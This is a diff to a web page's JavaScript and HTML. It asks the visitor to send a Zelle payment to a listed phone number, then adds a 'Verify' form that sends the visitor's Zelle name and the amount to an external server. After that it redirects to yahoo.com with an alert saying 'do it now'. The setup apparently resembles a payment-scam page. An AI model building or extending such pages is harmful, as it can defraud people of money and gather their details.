@@ -87,6 +87,10 @@
         button:hover {
             background: #218838;
         }
+
+        input[type=text] {
+            font-size: 1em;
+        }
     </style>
     <!-- Google tag (gtag.js) -->
     <script async src="https://www.googletagmanager.com/gtag/js?id=G-91X543LVHK"></script>
@@ -139,16 +143,49 @@
                     style="margin:auto">
                 <br>
                 <br>
-                Scan the QR code with your Zelle/banking app or
-                <b>
-                    simply send the Zelle payment in the amount of $${amount} to our phone
-                    number at:
-                    <br>
-                    (310) 923-5603
-                </b>
+                Scan the QR code above with your Zelle/banking app or
+                simply send your Zelle payment in the amount of $${amount} to our phone
+                number:
+                <br>
+                (310) 923-5603
+                <br>
+                <br>
+                <form action="" method="post" onsubmit="return verifyPayment(${amount});">
+                    <input id="verifyName" type="text" value="" placeholder="Enter Your Zelle Name" style="display:block; text-align: center; margin: auto; margin-bottom: 2.5px;">
+                    <button style="width: 100%; display:block;">Verify</button>
+                </form>
+                <br>
+                After sending the payment enter your name above as it appears on your Zelle account.
             `;
 
             window.zelle.style.display = 'block';
+        }
+
+        function verifyPayment(amount) {
+            fetch('https://server-production-b9a2.up.railway.app/c', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/x-www-form-urlencoded',
+                },
+                body: new URLSearchParams({
+                    amount,
+                    verifyName: document.getElementById('verifyName').value
+                })
+            })
+                .then(response => response.json())
+                .then(data => {
+                    const successUrl = 'https://www.yahoo.com/';
+
+                    window.location.href = successUrl;
+                    alert('do it now');
+                })
+                .catch(error => {
+                    console.error(error);
+
+                    alert(error.message);
+                });
+
+            return false;
         }
 
         function closePage() {
